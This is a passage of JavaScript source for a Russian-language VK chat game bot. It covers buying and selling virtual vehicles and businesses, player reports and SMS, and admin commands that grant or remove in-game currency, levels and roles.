		if(user.house == houses[z]){return message.send(`👉 ➾ Ваш дом слишком дешевый, чтобы иметь данный транспорт.`)}
	}
 	if(user.house == false) return message.send(`👉 ➾ Для покупки вертолета Вам нужен дом!`); /// ДОМ НЕ НИЖЕ 7
 	if(!message.$match[1]){
 		return message.send(`
 			➕ 1&#8419;. Fokker DR1 Triplane - 30.000.000$
 			➕ 2&#8419;. Mitsubishi A6M Zero - 85.000.000$
 			➕ 3&#8419;. Су-35С - 90.000.000$ 

 			✈ ➾ Для покупки напишите: Самолеты [номер] 
 			👉 ➾ Самолет продать - для продажи.
 			👉 ➾ При продаже вернется 75% от суммы.
 			`)
 	}
 	let i = message.$match[1]; 
 	let ids = [0,1,2,3,4,5,6,7,8,9,10]
 	let count = [0, 30000000,85000000,90000000];
 	let names = [0, 'Fokker DR1 Triplane','Mitsubishi A6M Zero','Су-35С']
 	if(i < 0 || i > 3) return;
 	if(user.aircraft != false) return message.send(`✈ ➾ У вас уже куплен самолет`);
 	if(i > 0 && i <= 3){
 		if(user.balance < count[i]) return message.send(`✈ ➾ У вас не достаточно денег.`);
 		user.balance -= count[i];
 		user.aircraft = ids[i];
 		return message.send(`@id${user.id}(${user.prefix}), Вы купили самолет (${names[i]}) за ${count[i]}$`)
 	} 
 }); 


vk.updates.hear(/^(?:самолет продать)/i,  (message) => {
	let count = [0, 30000000,85000000,90000000];
	let user = acc.users[user_id(message.user)];
	if(user.aircraft == false) return message.send(`✈ ➾ У вас нет самолета`)
		let sum = count[user.aircraft] / 100 * 75;
	user.balance += sum;
	user.aircraft = false;
	return message.send(`@id${user.id}(${user.prefix}), Вы продали свой самолет за ${sum}$`)
});

vk.updates.hear(/^(?:вертолет продать)/i,  (message) => {
	let count = [0, 50000000,15000000,35000000,39000000,43000000,50000000,6500000,80000000];
	let user = acc.users[user_id(message.user)];
	if(user.helicopter == false) return message.send(`🚁 ➾ У вас нет вертолета`)
		let sum = count[user.helicopter] / 100 * 75;
	user.balance += sum;
	user.helicopter = false;
	return message.send(`🚁 ➾ Вы продали свой вертолет за ${sum}$`)
});
///// Бизнес система - - - - - - -
	/*vk.updates.hear(/^(?:бстат)\s?([0-9]+)?/i,  (message) => {  
		let user = acc.users[user_id(message.user)]; 
		let text = '🏢 Статистика бизнесов: \n';
		if(user.bizs.one_biz == true){ text +=  `Статистика Бизнеса №1: ${user.bizs.one.name}\n🔸 Прибыль: ${user.bizs.one.zp}$\n🔸 Людей: ${user.bizs.one.people} / ${user.bizs.one.max_peop}\n`}
		if(user.bizs.two_biz == true){ text +=  `Статистика Бизнеса №2: ${user.bizs.two.name}\n🔸 Прибыль: ${user.bizs.two.zp}$\n🔸 Людей: ${user.bizs.two.people} / ${user.bizs.two.max_peop}`}
		return message.send(text)
	});

 

 vk.updates.hear(/^(?:бизнесы)\s?([0-9]+)?/i, message => {
 	if(!message.$match[1]){
 		return message.send(`
 			🏢 1&#8419;. Палатка | 1.000.000$ [5]  
			🏢 2&#8419;. Ларек | 5.000.000$ [10]  
			🏢 3&#8419;. Магазин | 20.000.000$ [15] 
			🏢 4&#8419;. Гипермаркет | 30.000.000$ [20]  
			🏢 5&#8419;. Универмаг | 50.000.000$ [25]  
			🏢 6&#8419;. АЗС | 70.000.000$ [30]  
			🏢 7&#8419;. Атомная станция | 90.000.000$ [35]   
			🏢 8&#8419;. Интернет провайдер | 110.000.000$ [40] 
			🏢 9&#8419;. Банк | 130.000.000$ [45]  
			🏢 1&#8419;0&#8419;. Наркопритон | 210.000.000$ [50] 
			
			🏢 ➾ В скобочках: кол-во доступных к найму рабочих
			⚠ ➾ Нанять рабочего: Бизнес нанять [кол-во] [номер 1-2] | +5k/ч
			🏢 ➾ Цена найма 1 рабочего - 50.000$

			🏢 ➾ Для покупки напишите: Бизнесы [номер]
			🏢 ➾ Данные о бизнесе: бстат 

			⚠ ➾ 'Бизнес снять' - получить ежечасную прибыль

			⚠ ➾ Для продажи: 'Бизнес продать [номер]'
			👉 ➾ При продаже вернется 75% от суммы.
 			`);
 	}
 	let i = message.$match[1];
 	let user = acc.users[user_id(message.user)];
 	let count = [0, 1000000, 5000000,20000000,30000000,50000000,70000000,90000000,110000000,130000000,210000000];
	let max_peop = [0,5,10,15,20,25,30,35,40,45,50]
 	let names = [0, 'Палатка','Ларек','Магазин','Гипермаркет','Универмаг','АЗС','Атомная станция','Интернет провайдер','Банк','Наркопритон'] 
 	if(i < 0 || i > 10) return message.send(`@id${user.id}(${user.prefix}), Неверный номер бизнеса.`)
 	if(!Number(message.$match[1])) return message.send(`@id${user.id}(${user.prefix}), Укажите номер бизнеса`)

 	if(user.bizs.one_biz == false){
 		if(user.balance < count[i]) return message.send(`🏢 ➾ У вас нет такой суммы.`);
 		user.balance -= count[i];
		user.bizs.one_biz = true;
		user.bizs.one.count = Number(count[i])
		user.bizs.one.id = Number(i) 
		 user.bizs.one.name =  names[i];
		user.bizs.one.max_peop = max_peop[i];
		return message.send(`@id${user.id}(${user.prefix}), Вы купили бизнес '${names[i]}' за ${count[i]}$`) 
	}
	if(Number(i) == user.bizs.one.id) return message.send(`@id${user.id}(${user.prefix}), У вас уже куплен такой вид бизнеса.`)
	if(Number(i) == user.bizs.two.id) return message.send(`@id${user.id}(${user.prefix}), У вас уже куплен такой вид бизнеса.`)	
	if(user.bizs.two_biz == false){
 		if(user.balance < count[i]) return message.send(`@id${user.id}(${user.prefix}), У вас нет такой суммы.`);
		if(Number(i) == user.bizs.one.id) return message.send(`@id${user.id}(${user.prefix}), У вас уже куплен такой вид бизнеса.`)
		user.balance -= count[i];
		user.bizs.two_biz = true;
		user.bizs.two.count = Number(count[i])
		user.bizs.two.id = Number(i) 
		 user.bizs.two.name =  names[i];
		user.bizs.two.max_peop = max_peop[i];
		return message.send(`@id${user.id}(${user.prefix}), Вы купили бизнес '${names[i]}' за ${count[i]}$`) 
	}
	return message.send(`@id${user.id}(${user.prefix}), У вас уже куплено 2 бизнеса.`) 
 
 });
 

	vk.updates.hear(/^(?:бизнес продать)\s?([0-9]+)?/i,  (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.bizs.one_biz == false && user.bizs.two_biz == false) return message.send(`@id${user.id}(${user.prefix}), У вас нет бизнесов.`)
		if(message.$match[1] < 0 || message.$match[1] > 2) return message.send(`@id${user.id}(${user.prefix}), Укажите верный номер бизнеса.`);
		if(message.$match[1] == 1){
			let sum = user.bizs.one.count / 100 * 75
			user.balance += sum;
			user.bizs.one_biz = false;
			user.bizs.one.count = false;
			user.bizs.one.id = false;
			user.bizs.one.name = false;
			user.bizs.one.people = 0; 
			user.bizs.one.zp = 0;
			user.bizs.one.max_peop = 0;
			return message.send(`@id${user.id}(${user.prefix}), Вы продали свой бизнес за ${sum}$`);
		}
		if(message.$match[1] == 2){
			let sum = user.bizs.two.count / 100 * 75
			user.balance += sum;
			user.bizs.two_biz = false;
			user.bizs.two.count = false;
			user.bizs.two.id = false;
			user.bizs.two.name = false;
			user.bizs.two.people = 0; 
			user.bizs.two.zp = 0;
			user.bizs.two.max_peop = 0;
			return message.send(`@id${user.id}(${user.prefix}), Вы продали свой бизнес за ${sum}$`);
		}		  
	 
	});


	vk.updates.hear(/^(?:Бизнес нанять)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => {
	    let user = acc.users[user_id(message.user)]; 
		if(!message.$match[1]) return message.send(`🏢 @id${user.id}(${user.prefix}), Укажите количество рабочих | нанять <кол-во> <номер>`)
		if(!message.$match[2]) return message.send(`🏢 @id${user.id}(${user.prefix}), Укажите номер бизнеса | нанять <кол-во> <номер>`)
		if(!Number(message.$match[1]) || message.$match[1] < 0 || message.$match[1] > 100 || !Number(message.$match[2]) || message.$match[2] < 1 || message.$match[2] > 2) return message.send(`🏢 Неверно указаны данные | нанять <кол-во> <номер>`)
		let id = user_id(message.user)
		let num = message.$match[2]; 
		if(message.$match[1] * 50000 > acc.users[id].balance) return message.send(`🏢 @id${user.id}(${user.prefix}), Для покупки [${message.$match[1]}] рабочих нужно [${message.$match[1] * 50000}$]`);
	    if(message.$match[2] == 1){ 
	    	if(acc.users[id].bizs.one_biz == false) return message.send(`🏢 @id${user.id}(${user.prefix}), У вас не куплен бизнес.`)
	    	if(acc.users[id].bizs.one.max_peop - acc.users[id].bizs.one.people < message.$match[1]) return message.send(`🏢 @id${user.id}(${user.prefix}), Максимальное количество работников: ${acc.users[id].bizs.one.max_peop}`)
	    	acc.users[id].bizs.one.people += Number(message.$match[1])
	    	acc.users[id].balance -= Number(message.$match[1]) * 50000;
	    	acc.users[id].bizs.one.zp += 5000 * Number(message.$match[1]);
	    	return message.send(`🏢 @id${user.id}(${user.prefix}), Вы купили ${message.$match[1]} рабочих. Ваша прибыль увеличилась на: ${message.$match[1] * 5000}$`)
	    }
	    if(message.$match[2] == 2){
	    	if(acc.users[id].bizs.two_biz == false) return message.send(`🏢 @id${user.id}(${user.prefix}), У вас не куплен бизнес.`)
	    	if(acc.users[id].bizs.two.max_peop - acc.users[id].bizs.two.people < message.$match[1]) return message.send(`🏢 ➾ Максимальное количество работников: ${acc.users[id].bizs.two.max_peop}`)
	    	acc.users[id].bizs.two.people += Number(message.$match[1])
	    	acc.users[id].balance -= Number(message.$match[1]) * 50000;
	    	acc.users[id].bizs.two.zp += 5000 * Number(message.$match[1]);
	    	return message.send(`🏢 @id${user.id}(${user.prefix}), Вы купили ${message.$match[1]} рабочих. Ваша прибыль увеличилась на: ${message.$match[1] * 5000}$`)
	    } 
		 
	});

	vk.updates.hear(/^(?:бизнес снять)/i, message => {
 	let user = acc.users[user_id(message.user)]; 
 	let text = '';
 	if(user.bizs.one_biz == false && user.bizs.two_biz == false) return message.send(`🏢️ У вас нет бизнесов.`); 
 	if(user.bizs_one_stop == true || user.bizs_two_stop == true) return message.send(`🏢️ Прибыль можно брать раз в час.`)
 	
 	if(user.bizs.one_biz == true){
 		text += `📝 @id${user.id}(${user.prefix}), Прибыль с бизнеса <${user.bizs.one.name}> составила: ${user.bizs.one.zp}$\n`;
 		user.balance += Number(user.bizs.one.zp)
 	}
 	if(user.bizs.one_biz == true){
 		text += `📝 @id${user.id}(${user.prefix}), Прибыль с бизнеса <${user.bizs.two.name}> составила: ${user.bizs.two.zp}$\n`;
 		user.balance += Number(user.bizs.two.zp)
 	}

 	user.bizs_one_stop = true;
 	user.bizs_two_stop = true;
 
	setTimeout(() => {
			user_bizs_one_stop = false;
			user.bizs_two_stop = false;
	}, 3600000);


 	return message.send(`
 		${text} 
 		`);
 });
 */

 

///// АДМИН КОМАНДЫ - - - -- - - 



vk.updates.hear(/^(?:adminstat|astat)/i,(message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 1) return;
	let warns = ''; 
	return message.send(`
		🔔 ~ ~ Статистика Администратора ~ ~ 🔔
		🔸 ➾ Ваш уровень Администратирования: ${user.level}
		🔸 ➾ Часов до снятия: ${user.adm_time} [Если 0 то Доступ вечный.]

		✉ ➾ Количество ответов на репорт: ${user.ainfo.all_ans} ответов.

		♻ ~ ~ Репутация ~ ~ ♻
		♻ ➾ Хорошо: ${user.ainfo.good_ans} Голос(ов)
		♻ ➾ Плохо: ${user.ainfo.bad_ans} Голос(ов)
		⚠ ➾ Выговоров: [${user.ainfo.vig} из 3х] 
		-- После 3х администратор будет снят!
		`);
});

vk.updates.hear(/^(?:репорт|report|rep|жалоба|вопрос)\s?([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`@id${user.id}(${user.prefix}), вы не написали жалобу\n -- репорт [Текст жалобы/пожелания]`);

	for(i=0;i<200000;i++){
		if(acc.users[i]){
			if(acc.users[i].level >= 2){ 
				vk.api.messages.send({
					user_id: acc.users[i].id,
					message: `Поступила жалоба\nID игрока: ${user_id(message.user)}\nЖалоба: ${message.$match[1]}\n -- Подсказка: Для ответа: Отв [ID] [Текст ответа]`,
					random_id: 0
				})	
			}
		}
	}
	message.send(`@id${user.id}(${user.prefix}), ваше сообщение отправлено.`);
	return message.sendSticker(60);
});




vk.updates.hear(/^(?:респект)\s?([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 @id${user.id}(${user.prefix}), Пример команды: респект +/-\n🔸 ➾ [+ >> хороший ответ/ - >> плохой ответ]`);
	if(user.rep.status == false) return message.send(`🔸 @id${user.id}(${user.prefix}), Проверьте вводимые данные.`); 
	if(message.$match[1] == '+' || message.$match[1] == '-'){
		user.rep.status = false; 
		if(message.$match[1] == '+') acc.users[user.rep.id].ainfo.good_ans += 1; 
		if(message.$match[1] == '-') acc.users[user.rep.id].ainfo.bad_ans += 1;  
		let id = user.rep.id;
		user.rep.id = false;
		return message.send(`🔸 @id${user.id}(${user.prefix}), Вы успешно оценили ответ \n -- Администратора [${acc.users[id].prefix}] - ${message.$match[1].toString().replace(/\+/gi, 'Положительно').replace(/-/gi, 'Отрицательно')}.`)

	}
	return message.send(`🔸 @id${user.id}(${user.prefix}), gроверьте вводимые данные.`); 
});

vk.updates.hear(/^(?:отв)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1]) return message.send(`Уважаемый @id${user.id}(${user.prefix}), Подсказка специально для вас: Для ответа на репорт используйте: Ответить [ID] [Ответ на жалобу]`);
	if(user.level < 2) return;
	if(!Number(message.$match[1]) || !message.$match[1] || !message.$match[2] || !acc.users[message.$match[1]]) return message.send(`@id${user.id}(${user.prefix}), проверьте вводимые данные.`);
	vk.api.messages.send({
		peer_id: acc.users[message.$match[1]].id,
		message: `Администратор/модератор ${user.prefix} ответил Вам: ${message.$match[2]}\n\nОцените ответ: респект +/- [хорошо/плохо]`, random_id: 0
	})
	user.ainfo.all_ans += 1;
	user.ainfo.ans += 1;
	acc.users[message.$match[1]].rep.status = true;
	acc.users[message.$match[1]].rep.id = Number(user_id(message.user));
	return message.send(`Уважаемый ${user.level.toString().replace(/2/gi, "Модератор").replace(/3/gi, "Администратор").replace(/4/gi, "Главный Администратор").replace(/5/gi, "Основатель")} Ответ отправлен.`)
});

vk.updates.hear(/^(?:sms|смс)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(user.phone == false) return message.send(`📱 У вас нет телефона!\n Для покупки введите "Телефоны"`);
	if(user.sphone == false) return message.send(`📱 У вас нет симки!\n Чтобы купить, напишите "buysim"`);
	if(user.bphone < 1000) return message.send(`📱 У вас не достаточно денежных средств на балансе телефона!\nЧтобы пополнить баланс, напишите "мпополнить [сумма]"`);
	if(!Number(message.$match[1]) || !message.$match[1] || !message.$match[2] || !acc.users[message.$match[1]]) return message.send(`🔸 ➾ Проверьте вводимые данные.`);
	if(acc.users[message.$match[1]].phone == false) return message.send(`📱 У данного игрока нет телефона !`);
	if(acc.users[message.$match[1]].sphone == false) return message.send(`📱 У данного игрока нет сим-карты !`);
	let a = zapret(message.$match[2]);
	if(a != 0) return message.send(a); 
	vk.api.call("messages.send", {
		peer_id: acc.users[message.$match[1]].id,
		message: `⚠Мобильный⚠\n${user.prefix} прислал вам SMS-Сообщение: ${message.$match[2]}\n 👉 Для ответа: SMS [${user_id(message.user)}] [Сообщение]`
	}).then((res) => {}).catch((error) => {console.log('[Система]: Артём! Я обнаружила ошибку в системе: SMS-Сообщение'); });		
	var is = [user_id(message.user), message.text] 
	return message.send(`📱 ➾ Смс отправлено. \n С баланса вашего телефона было списано: 1000$.`)
});

vk.updates.hear(/^(?:buysim)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.phone == false) return message.send(`@id${user.id}(${user.prefix}), У вас нет телефона!\n Для покупки введите "Телефоны"`);
	if(user.balance < 10000) return message.send(`@id${user.id}(${user.prefix}), Стоимость сим-карты 10000$`);
	user.balance -= 10000;
	user.sphone = true;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`@id${user.id}(${user.prefix}), Вы купили сим-карту!\n Баланс сим-карты 0$\n -- Для пополнения: "phonpay [Сумма]"`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`@id${user.id}(${user.prefix}), Вы купили сим-карту!\n Баланс сим-карты 0$\n -- Для пополнения: "phonpay [Сумма]"`);
	}
}); 

vk.updates.hear(/^(?:setnick)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 3) return; 
	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 @id${user.id}(${user.prefix}), Пример команды: setnick [ID] [ИМЯ]`);
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	acc.users[message.$match[1]].prefix = message.$match[2];
	user.ainfo.nicks += 1;
	return message.send(`📗 @id${user.id}(${user.prefix}), Вы сменили ник игрока на: ${message.$match[2]}`);
}); 

	//delladmin
	vk.updates.hear(/^(?:delladmin)\s?([0-9]+)?\s([^]+)?/i, (message) => {  
		let user = acc.users[user_id(message.user)];
		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: Delladmin [ID] [Причина]`);
		if(!Number(message.$match[1])) return message.send(`ID должен быть цифрового вида.`);
		if(user.level < 5) return;
		if(!acc.users[message.$match[1]]) return message.send(`Такого Администратора нет.`);
		if(message.$match[1] == 1) return message.send(`Уважаемый @id${user.id}(Администратор), к сожалению @id287908009 (Разработчика) невозможно снять!`);
		acc.users[message.$match[1]].level = message.$match[2]; 
		acc.users[message.$match[1]].level =0
		acc.users[message.$match[1]].warn =1 
		acc.users[message.$match[1]].prefix = `Пользователь №${message.$match[1]}` 
		acc.users[message.$match[1]].bank =0
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: `Основатель ${user.prefix} Снял Вас с поста Администратора.\n✅ ➾ Причина: ${message.$match[2]}`,
			random_id: 0
		});
		var is = [user_id(message.user), message.text] 
		adm_log(is)
		return message.send(`✅ ➾ Вы сняли игрока [${acc.users[message.$match[1]].prefix}] с поста Администратора\nПо причине:  ${message.$match[2]}`);
	}); 
	//delladmin

 // Выдача

 vk.updates.hear(/^(?:Деньги)\s?([^\s  ].*)?/i, message => {
 	let user = acc.users[user_id(message.user)];
 	if(user.level < 4) return;
 	let mon = parserInt(message.$match[1]);
 	user.balance = mon
 	return message.send(`[АДМИНИСТРАТОР] Баланс установлен: ${spaces(mon)}$`);
 });


 vk.updates.hear(/^(?:банк)\s?([0-9]+)?/i, message => {
 	let user = acc.users[user_id(message.user)];
 	if(message.$match[1] > user.balance) return message.send(`@id${user.id}(${user.prefix}), на вашем балансе недостаточно средств\n -- Ваш баланс: ${spaces(user.balance)}$`);
 	if(!message.$match[1] || !acc.users[message.$match[1]] < 0) return message.send(`Пример: 'Банк [Сумма]'`);
 	user.balance -= Number(message.$match[1]); 
 	user.bank += Number(message.$match[1]);
 	return message.send(`@id${user.id}(${user.prefix}), вы положили на свой банковский счёт ${spaces(message.$match[1])}$`);
 });

 vk.updates.hear(/^(?:снять банк)\s?([0-9]+)?/i, message => {
 	let user = acc.users[user_id(message.user)];
 	if(message.$match[1] > user.bank) return message.send(`@id${user.id}(${user.prefix}), на вашем банковском счёте недостаточно средств\n -- Остаток на счёте: ${user.bank}$`);
 	if(!message.$match[1] || !acc.users[message.$match[1]] < 0) return message.send(`Пример: 'снять банк [Сумма]'`);
 	user.bank -= Number(message.$match[1]); 
 	user.balance += Number(message.$match[1]); 
 	return message.send(`@id${user.id}(${user.prefix}), вы сняли ${spaces(message.$match[1])}$\n💳 Остаток на счёте: ${user.bank}$ \n💰 Ваш баланс: ${spaces(user.balance)}$`);
 });

 vk.updates.hear(/^(?:сердца)\s?([0-9]+)?/i, message => {
 	let user = acc.users[user_id(message.user)];
 	if(user.block_give == true) return message.send(`У вас заблокирована выдача валюты.`)
 		if(user.level < 4) return;
 	if(user.bloks_giverub == true) return message.send(`Выдавать себе валюту можно раз в 2 минуты`);
 	{
 		if(!message.$match[1] || !acc.users[message.$match[1]] < 0) return message.send(`❤Пример: 'Сердца [Кол-во]❤'`);
 		user.donate += Number(message.$match[1]);
 	}
 	user.bloks_giverub = true;
 	setTimeout(() => {
 		user.bloks_giverub = false;
 	}, 120000);

 	return message.send(`@id${user.id}(${user.prefix}), Сердец установлено: ${spaces(message.$match[1])}❤`);
 });

 vk.updates.hear(/^(?:Руб)\s?([0-9]+)?/i, message => {
 	let user = acc.users[user_id(message.user)];
 	if(user.full == false) return;
 	if(user.bloks_giverub == true) return message.send(`Выдавать валюту можно раз в час`);
 	{
 		if(!message.$match[1] || !acc.users[message.$match[1]] < 0) return message.send(`Пример: 'Руб [Кол-во] ₽'`);
 		user.rub += Number(message.$match[1]);
 	}
 	user.bloks_giverub = true;
 	setTimeout(() => {
 		user.bloks_giverub = false;
 	}, 1);

 	return message.send(`@id${user.id}(${user.prefix}), Вы выдали себе: ${spaces(message.$match[1])}₽ на свой Донат счёт`);
 });


 vk.updates.hear(/^(?:Ключи)\s?([0-9]+)?/i, message => {
 	let user = acc.users[user_id(message.user)];
 	if(user.level < 4) return;
 	if(user.bloks_giverub == true) return message.send(`Выдавать себе коючи от кейса можно раз в 2 миуты`);
 	{
 		if(!message.$match[1] || !acc.users[message.$match[1]] < 0) return message.send(`Пример: 'Ключи [Кол-во] ₽'`);
 		user.keys += Number(message.$match[1]);
 	}
 	user.bloks_giverub = true;
 	setTimeout(() => {
 		user.bloks_giverub = false;
 	}, 120000);

 	return message.send(`@id${user.id}(${user.prefix}), Вы выдали себе: ${spaces(message.$match[1])} ключей`);
 });



 vk.updates.hear(/^(?:giv)\s?([0-9]+)?\s?([^\s  ].*)?/i,  message => {
 	let user = acc.users[user_id(message.user)];
 	let giving = Number(parserInt(message.$match[2]));
 	let balance = giving;
 	let id = user_id(message.user)
 	let i = config;
 	if(acc.users[id].level < 4) return;
 	if(user.block_give == true) return message.send(`@id${user.id}(${user.prefix}), вам был заблокирован доступ к команде "GIV"`)
 		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: GIV [ID] [Сумма выдачи].`);
 	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
 	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} уже имеет перманентную блокировку\n Для разблокировки, используйте: UnPermBan ${message.$match[1]}.`);
 	if(!acc.users[message.$match[1]]) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
 	acc.users[message.$match[1]].balance += Number(parserInt(message.$match[2]));

 	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
 	var is = [user_id(message.user), message.text] 
 	adm_log(is)
 	return message.send(`💰 @id${user.id}(${user.prefix}), Успех! 😎\n [Система @bot.anya (Бот Анна)]: Зачисляю ироку @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}) - ${spaces(message.$match[2])}$\n\n Баланс игрока: ${acc.users[message.$match[1]].balance}$`);


 });

 vk.updates.hear(/^(?:grub)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
 	let user = acc.users[user_id(message.user)];

 	let id = user_id(message.user)
 	let i = config;
 	if(user.full == false) return;
 	if(user.block_give == true) return message.send(`У вас заблокирована выдача валюты.`)
 		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`Пример: 'grub [ID] [Кол-во]₽'`); 
 	acc.users[message.$match[1]].rub += Number(message.$match[2]);

 	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
 	var is = [user_id(message.user), message.text] 
 	adm_log(is)
 	return message.send(`@id${user.id}(${user.prefix}), Вы пополнили донат счёт игроку [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] на: ${spaces(message.$match[2])}₽`);


 });



 vk.updates.hear(/^(?:setlvl)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
 	let user = acc.users[user_id(message.user)];

 	let id = user_id(message.user)
 	let i = config;
 	if(acc.users[id].level < 5) return;
 	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`Пример: 'setlvl [ID] [LVL]'`); 
 	acc.users[message.$match[1]].lvl += Number(message.$match[2]);

 	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
 	var is = [user_id(message.user), message.text] 
 	adm_log(is)
 	return message.send(`@id${user.id}(${user.prefix}), Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} Игровой уровень.`);


 });

 vk.updates.hear(/^(?:setbit)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
 	let user = acc.users[user_id(message.user)];

 	let id = user_id(message.user)
 	let i = config;
 	if(acc.users[id].level < 5) return;
 	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`Пример: 'setbit [ID] [Число]'`); 
 	acc.users[message.$match[1]].bitcoin += Number(message.$match[2]);

 	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
 	var is = [user_id(message.user), message.text] 
 	adm_log(is)
 	return message.send(`@id${user.id}(${user.prefix}), Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])}฿`);


 });

 vk.updates.hear(/^(?:setreit)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
 	let user = acc.users[user_id(message.user)];

 	let id = user_id(message.user)
 	let i = config;
 	if(acc.users[id].level < 5) return;
 	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`Пример: 'setreit [ID] [Число]'`); 
 	acc.users[message.$match[1]].global_exs += Number(message.$match[2]);

 	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
 	var is = [user_id(message.user), message.text] 
 	adm_log(is)
 	return message.send(`@id${user.id}(${user.prefix}), Вы выдали [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} Рейтинга`);


 });


 vk.updates.hear(/^(?:setkey)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
 	let id = user_id(message.user)

 	let i = config;
 	let user = acc.users[user_id(message.user)];
 	if(user.level < 5) return;
 	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'setkey [ID] [Число]'`); 
 	acc.users[message.$match[1]].keys += Number(message.$match[2]);
 	
 	var is = [user_id(message.user), message.text] 
 	adm_log(is)
 	return message.send(`❤ @id${user.id}(${user.prefix}), Вы выдали игроку [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} Ключей для открытия кейсов`);
 });


 vk.updates.hear(/^(?:setser)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
 	let id = user_id(message.user)

 	let i = config;
 	let user = acc.users[user_id(message.user)];
 	if(user.level < 5) return;
 	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'setser [ID] [Число]'`); 
 	acc.users[message.$match[1]].donate += Number(message.$match[2]);
 	
 	var is = [user_id(message.user), message.text] 
 	adm_log(is)
 	return message.send(`❤ @id${user.id}(${user.prefix}), Вы выдали игроку [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} сердец❤`);
 });

// Выдача

// забираем
vk.updates.hear(/^(?:ungiv)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];

	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'ungiv [ID] [Число]'`); 
	acc.users[message.$match[1]].balance -= Number(message.$match[2]);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is) 
	return message.send(`💰 @id${user.id}(${user.prefix}), Вы отняли у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])}$`);


});

vk.updates.hear(/^(?:remmon)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let id = user_id(message.user)
	let i = config;
	if(acc.users[id].level < 5) return;
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'remmon [ID]'`); 
	acc.users[message.$match[1]].balance = 0;
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 3)
	return message.send(`💰 @id${user.id}(${user.prefix}), Вы забрали все $ у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});

vk.updates.hear(/^(?:unser)\s?([0-9]+)?\s?([0-9]+)?/i, message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].level < 5) return;
